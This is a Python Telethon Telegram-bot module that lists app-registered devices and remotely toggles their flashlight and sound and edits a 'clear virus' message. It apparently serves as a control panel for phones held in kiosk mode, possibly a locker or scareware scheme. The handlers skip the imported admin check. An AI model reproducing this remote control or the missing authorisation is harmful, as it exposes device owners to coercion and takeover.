# bmcodexbot/bot_handlers/remote/devices.py
from telethon import events, Button, errors
from datetime import datetime
from config import bot, ADMIN_ID
from firebase_manager import (
    get_app_devices, 
    get_all_apps, 
    update_device_flash,
    update_device_suara,
    update_device_pesan_clear_virus
)
from .state import REMOTE_SEARCH_QUERY

# Helper pagination
def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def parse_datetime(waktu_str):
    """Parse waktu_start format: DD/MM/YYYY HH:MM:SS"""
    try:
        if not waktu_str or waktu_str == '-':
            return datetime.min
        # Format: "29/11/2025 19:36:01"
        return datetime.strptime(waktu_str, "%d/%m/%Y %H:%M:%S")
    except:
        return datetime.min

def sort_devices_by_time(devices_dict):
    """Sort devices by waktu_start (terbaru di atas)"""
    devices_list = []
    for dev_id, info in devices_dict.items():
        waktu_start = info.get('waktu_start', '')
        devices_list.append((dev_id, info, parse_datetime(waktu_start)))
    
    # Sort descending (terbaru di atas)
    devices_list.sort(key=lambda x: x[2], reverse=True)
    return [(dev_id, info) for dev_id, info, _ in devices_list]


def parse_app_and_dev(data_content):
    """Robust parser for data_content that may be in either:
    'app:dev' (preferred) or 'app_dev' (legacy). It will try to match by colon first,
    then try to match apps list longest-first to avoid prefix collisions, then fallback.
    Returns (app_name, dev_id) or (None, None) if parsing fails.
    """
    # Colon-based format is unambiguous in most cases
    if ":" in data_content:
        # split only on the first colon -- app names may contain colons rarely
        parts = data_content.split(":", 1)
        if len(parts) == 2 and parts[0] and parts[1]:
            return parts[0].strip(), parts[1].strip()

    # Fallback: try to match using known app names (longest first to avoid prefix collisions)
    apps = get_all_apps()
    apps_sorted = sorted((str(a).strip() for a in apps), key=len, reverse=True)
    for app in apps_sorted:
        if data_content.startswith(app + "_"):
            return app, data_content[len(app) + 1:]

    # Final fallback: split by first underscore
    if "_" in data_content:
        parts = data_content.split("_", 1)
        if len(parts) == 2:
            return parts[0].strip(), parts[1].strip()

    return None, None

@bot.on(events.CallbackQuery(pattern=r"rapp_devlist_(.+)"))
async def cb_remote_device_list(event):
    full_data = event.data.decode()
    # Format: rapp_devlist_{app_name}:{page}:{search}
    # atau: rapp_devlist_{app_name}
    parts = full_data.replace("rapp_devlist_", "", 1).split(":")
    app_name = parts[0].strip()
    page = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
    search_param = parts[2] if len(parts) > 2 else None
    
    devices = get_app_devices(app_name)
    
    if not devices:
        msg = (
            f"📱 **DAFTAR PERANGKAT**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Aplikasi:** `{app_name}`\n\n"
            f"❌ Belum ada perangkat terdeteksi."
        )
        buttons = [[Button.inline("⬅️ Kembali", data=f"rapp_view_{app_name}")]]
        return await event.edit(msg, buttons=buttons)
    
    # Get search query
    user_id = event.sender_id
    if search_param:
        REMOTE_SEARCH_QUERY[user_id] = search_param
    query = REMOTE_SEARCH_QUERY.get(user_id, "").lower()
    
    # Filter devices berdasarkan search query
    if query:
        filtered_devices = {}
        for dev_id, info in devices.items():
            dev_name = str(info.get('nama_perangkat', '')).lower()
            dev_id_lower = dev_id.lower()
            if query in dev_name or query in dev_id_lower:
                filtered_devices[dev_id] = info
        devices = filtered_devices
    
    # Sort devices by waktu_start (terbaru di atas)
    sorted_devices = sort_devices_by_time(devices)
    
    # Pagination
    ITEMS_PER_PAGE = 10
    chunks = list(chunk_list(sorted_devices, ITEMS_PER_PAGE))
    
    if not chunks:
        current_chunk = []
        total_pages = 1
    else:
        if page >= len(chunks): page = 0
        if page < 0: page = 0
        current_chunk = chunks[page]
        total_pages = len(chunks)
    
    # Build message
    msg = (
        f"📱 **DAFTAR PERANGKAT**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**Aplikasi:** `{app_name}`\n"
        f"**Total:** {len(sorted_devices)} perangkat"
    )
    if query:
        msg += f"\n**🔎 Pencarian:** `{query}` ({len(sorted_devices)} hasil)"
    msg += f"\n**📄 Halaman:** {page + 1}/{total_pages}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"Pilih perangkat untuk kontrol remote:\n"
    
    # Build buttons
    buttons = []
    for dev_id, info in current_chunk:
        dev_name = info.get('nama_perangkat', 'Unknown Device')
        batt = info.get('persen_baterai', '?')
        status_baterai = info.get('status_baterai', '')
        waktu_start = info.get('waktu_start', '-')
        
        # Format waktu untuk display (singkat)
        waktu_display = waktu_start
        if waktu_start and waktu_start != '-':
            try:
                dt = parse_datetime(waktu_start)
                if dt != datetime.min:
                    waktu_display = dt.strftime("%d/%m %H:%M")
            except:
                pass
        
        # Icon berdasarkan status baterai
        batt_icon = "🔋" if status_baterai == "Charging" else "🔌"
        
        # Truncate nama jika terlalu panjang
        dev_name_display = dev_name[:25] + "..." if len(dev_name) > 25 else dev_name
        
        button_text = f"{batt_icon} {dev_name_display} ({batt}%)"
        # Use colon delimiter for app/dev to avoid ambiguity with underscores in names
        buttons.append([Button.inline(button_text, data=f"rapp_act:{app_name}:{dev_id}")])
    
    # Navigation buttons
    nav_row = []
    if page > 0:
        callback_data = f"rapp_devlist_{app_name}:{page-1}"
        if query:
            callback_data += f":{query}"
        nav_row.append(Button.inline("⬅️ Sebelumnya", data=callback_data))
    nav_row.append(Button.inline(f"📄 {page+1}/{total_pages}", b"noop"))
    if page < total_pages - 1:
        callback_data = f"rapp_devlist_{app_name}:{page+1}"
        if query:
            callback_data += f":{query}"
        nav_row.append(Button.inline("Selanjutnya ➡️", data=callback_data))
    if nav_row:
        buttons.append(nav_row)
    
    # Search & Action buttons
    search_btn_text = f"🔍 Cari: {query}" if query else "🔍 Cari Perangkat"
    action_row = [Button.inline(search_btn_text, data=f"rapp_search_{app_name}")]
    if query:
        action_row.append(Button.inline("❌ Reset", data=f"rapp_reset_search_{app_name}"))
    buttons.append(action_row)
    
    # Back button
    buttons.append([Button.inline("⬅️ Kembali", data=f"rapp_view_{app_name}")])
    
    try: 
        await event.edit(msg, buttons=buttons)
    except errors.MessageNotModifiedError: 
        pass

def get_flash_next(current):
    """Cycle: off -> kedip -> on -> off"""
    if current == "off" or current == "" or current is None:
        return "kedip"
    elif current == "kedip":
        return "on"
    else:  # on
        return "off"

def get_suara_next(current):
    """Toggle: on -> off -> on"""
    if current == "on":
        return "off"
    else:  # off or empty
        return "on"

def get_flash_icon(current):
    """Get icon for flash status"""
    if current == "kedip":
        return "💡"
    elif current == "on":
        return "🔆"
    else:  # off
        return "🔅"

def get_suara_icon(current):
    """Get icon for suara status"""
    return "🔊" if current == "on" else "🔇"

def render_device_menu(app_name, dev_id, devices):
    """Helper function to render device menu"""
    dev_info = devices.get(dev_id, {})
    nm = dev_info.get('nama_perangkat', 'Unknown')
    bt = dev_info.get('persen_baterai', 0)
    st = dev_info.get('status_keluar_mode_kios', 'Unknown')
    wk = dev_info.get('waktu_start', '-')
    flash_val = dev_info.get('flash', 'off')
    suara_val = dev_info.get('suara', 'off')
    pesan_cv = dev_info.get('pesan_clear_virus', '')
    status_baterai = dev_info.get('status_baterai', '-')
    
    # Format pesan dengan keterangan yang lebih jelas
    msg = (
        f"🎮 **REMOTE CONTROL PERANGKAT**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 **ID Perangkat:** `{dev_id}`\n"
        f"📛 **Nama Perangkat:** **{nm}**\n"
        f"🔋 **Baterai:** {bt}% ({status_baterai})\n"
        f"📊 **Status Kiosk:** `{st}`\n"
        f"⏰ **Terakhir Online:** {wk}\n"
        f"💡 **Flash:** `{flash_val.upper()}`\n"
        f"🔊 **Suara:** `{suara_val.upper()}`\n"
        f"📝 **Pesan Clear Virus:** `{pesan_cv if pesan_cv else '(Kosong)'}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Pilih aksi yang ingin dilakukan:"
    )
    
    flash_icon = get_flash_icon(flash_val)
    suara_icon = get_suara_icon(suara_val)
    
    # Use colon separator for action callbacks: rapp_flash:app:dev
    buttons = [
        [Button.inline(f"{flash_icon} Flash: {flash_val.upper()}", data=f"rapp_flash:{app_name}:{dev_id}")],
        [Button.inline(f"{suara_icon} Suara: {suara_val.upper()}", data=f"rapp_suara:{app_name}:{dev_id}")],
        [Button.inline("✏️ Edit Pesan Clear Virus", data=f"rapp_editpesan:{app_name}:{dev_id}")],
        [Button.inline("⬅️ Kembali List", data=f"rapp_devlist_{app_name}:0")]
    ]
    return msg, buttons

@bot.on(events.CallbackQuery(pattern=r"rapp_act[:_](.+)"))
async def cb_remote_device_action_menu(event):
    full_data = event.data.decode()
    # Remove known prefix and delegate actual parsing to helper
    data_content = full_data.replace("rapp_act_", "", 1).replace("rapp_act:", "", 1)
    app_name, dev_id = parse_app_and_dev(data_content)
    if not app_name:
        return await event.answer("❌ Error parsing.", alert=True)
    
    devices = get_app_devices(app_name)
    msg, buttons = render_device_menu(app_name, dev_id, devices)
    
    try: await event.edit(msg, buttons=buttons)
    except errors.MessageNotModifiedError: pass

@bot.on(events.CallbackQuery(pattern=r"rapp_flash[:_](.+)"))
async def cb_remote_toggle_flash(event):
    full_str = event.data.decode()
    data_content = full_str.replace("rapp_flash_", "", 1).replace("rapp_flash:", "", 1)
    
    apps = get_all_apps()
    app_name = None
    dev_id = None
    
    app_name, dev_id = parse_app_and_dev(data_content)
    if not app_name:
        return await event.answer("❌ Error parsing.", alert=True)
    
    devices = get_app_devices(app_name)
    dev_info = devices.get(dev_id, {})
    current_flash = dev_info.get('flash', 'off')
    next_flash = get_flash_next(current_flash)
    
    if update_device_flash(app_name, dev_id, next_flash):
        await event.answer(f"✅ Flash diubah ke {next_flash.upper()}!", alert=True)
        # Refresh UI
        devices = get_app_devices(app_name)
        msg, buttons = render_device_menu(app_name, dev_id, devices)
        try: await event.edit(msg, buttons=buttons)
        except errors.MessageNotModifiedError: pass
    else:
        await event.answer("❌ Gagal update flash.", alert=True)

@bot.on(events.CallbackQuery(pattern=r"rapp_suara[:_](.+)"))
async def cb_remote_toggle_suara(event):
    full_str = event.data.decode()
    data_content = full_str.replace("rapp_suara_", "", 1).replace("rapp_suara:", "", 1)
    
    apps = get_all_apps()
    app_name = None
    dev_id = None
    
    app_name, dev_id = parse_app_and_dev(data_content)
    if not app_name:
        return await event.answer("❌ Error parsing.", alert=True)
    
    devices = get_app_devices(app_name)
    dev_info = devices.get(dev_id, {})
    current_suara = dev_info.get('suara', 'off')
    next_suara = get_suara_next(current_suara)
    
    if update_device_suara(app_name, dev_id, next_suara):
        await event.answer(f"✅ Suara diubah ke {next_suara.upper()}!", alert=True)
        # Refresh UI
        devices = get_app_devices(app_name)
        msg, buttons = render_device_menu(app_name, dev_id, devices)
        try: await event.edit(msg, buttons=buttons)
        except errors.MessageNotModifiedError: pass
    else:
        await event.answer("❌ Gagal update suara.", alert=True)

@bot.on(events.CallbackQuery(pattern=r"rapp_editpesan[:_](.+)"))
async def cb_remote_edit_pesan(event):
    full_str = event.data.decode()
    data_content = full_str.replace("rapp_editpesan_", "", 1).replace("rapp_editpesan:", "", 1)
    
    apps = get_all_apps()
    app_name = None
    dev_id = None
    
    app_name, dev_id = parse_app_and_dev(data_content)
    if not app_name:
        return await event.answer("❌ Error parsing.", alert=True)
    
    from .state import REMOTE_STATE
    user_id = event.sender_id
    REMOTE_STATE[user_id] = {
        "app": app_name, 
        "device": dev_id, 
        "action": "edit_pesan_clear_virus"
    }
    
    devices = get_app_devices(app_name)
    dev_info = devices.get(dev_id, {})
    pesan_sekarang = dev_info.get('pesan_clear_virus', '')
    
    await event.edit(
        f"✏️ **EDIT PESAN CLEAR VIRUS**\n"
        f"Perangkat: `{dev_id}`\n\n"
        f"Pesan saat ini: `{pesan_sekarang if pesan_sekarang else '(Kosong)'}`\n\n"
        f"Ketik pesan baru sekarang (atau kirim 'hapus' untuk menghapus pesan):",
        buttons=[Button.inline("❌ Batal", data=f"rapp_act:{app_name}:{dev_id}")]
    )

# --- Search Logic ---
@bot.on(events.CallbackQuery(pattern=r"rapp_search_(.+)"))
async def cb_remote_search_mode(event):
    full_data = event.data.decode()
    app_name = full_data.replace("rapp_search_", "", 1).strip()
    
    from .state import REMOTE_STATE
    user_id = event.sender_id
    REMOTE_STATE[user_id] = {
        "app": app_name,
        "action": "search_device"
    }
    
    await event.edit(
        f"🔍 **MODE PENCARIAN PERANGKAT**\n"
        f"Aplikasi: `{app_name}`\n\n"
        f"Ketik kata kunci untuk mencari perangkat (Nama atau ID Perangkat).\n"
        f"Ketik `/batal` untuk membatalkan.",
        buttons=[Button.inline("❌ Batal", data=f"rapp_devlist_{app_name}:0")]
    )

@bot.on(events.CallbackQuery(pattern=r"rapp_reset_search_(.+)"))
async def cb_remote_reset_search(event):
    full_data = event.data.decode()
    app_name = full_data.replace("rapp_reset_search_", "", 1).strip()
    
    user_id = event.sender_id
    if user_id in REMOTE_SEARCH_QUERY:
        del REMOTE_SEARCH_QUERY[user_id]
    
    # Refresh list
    event.data = f"rapp_devlist_{app_name}:0".encode()
    await cb_remote_device_list(event)
